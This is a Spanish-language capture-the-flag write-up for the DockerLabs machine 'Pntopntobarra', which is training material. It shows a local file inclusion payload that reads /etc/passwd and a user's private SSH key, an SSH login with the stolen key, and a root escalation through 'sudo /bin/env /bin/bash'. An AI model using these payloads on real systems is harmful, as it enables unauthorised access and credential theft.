---
layout: post
title: "Pntopntobarra"
date: 2024-11-01
 11:10:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Pntopntobarra </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

**1\.** Escaneamos los puertos y servicios activos en la maquina.

`sudo nmap -p- --open -sS -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/pntopntobarra/nmap.png){:.margin}

**2\.** En la web podemos ver una advertencia sobre un virus en nuestro sistema.

`http://172.17.0.2/`

![img](/notas/public/img/dockerlabs/pntopntobarra/80.png){:.margin}

_2.1- Pulse en el primer boton aceptando el buen reto y me peto la maquina, toco reinciarla :'(_

`http://172.17.0.2/`

![img](/notas/public/img/dockerlabs/pntopntobarra/80fakersituacion.png){:.margin}

_2.2- Vamos por el segundo boton, aqui todo bien; nos fijamos en la url donde aparentemente se acontese un LFI_

`http://172.17.0.2/ejemplos.php?images=./ejemplo1.png`

![img](/notas/public/img/dockerlabs/pntopntobarra/80ejemplo.png){:.margin}

**3\.** Nos aprovechamos del bug para ver el passwd, de ahi sacamos el usuario nico para luego visualizar su clave privada.

`http://172.17.0.2/ejemplos.php?images=/etc/passwd`

`http://172.17.0.2/ejemplo.php?images=/home/nico/.ssh/id_rsa`

![img](/notas/public/img/dockerlabs/pntopntobarra/80ejemplolfi.png){:.margin}
![img](/notas/public/img/dockerlabs/pntopntobarra/80ejemplorsa.png){:.margin}

**4\.** Lo guardamos la clave en un fichero, le damos los permisos pertinentes y luego nos conectamos por ssh.

`nano id_rsa`

`chmod 600 id_rsa`

`ssh -i id_rsa nico@172.17.0.2`

![img](/notas/public/img/dockerlabs/pntopntobarra/nanorsa.png){:.margin}
![img](/notas/public/img/dockerlabs/pntopntobarra/sshnico.png){:.margin}

**5\.** Una vez dentro encuentro un binario SUID, solo nos queda escalar a root podemos hechar un ojo a [gtfobins](https://gtfobins.github.io/gtfobins/env/#sudo).

`sudo -l`

`sudo /bin/env /bin/bash`

![img](/notas/public/img/dockerlabs/pntopntobarra/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>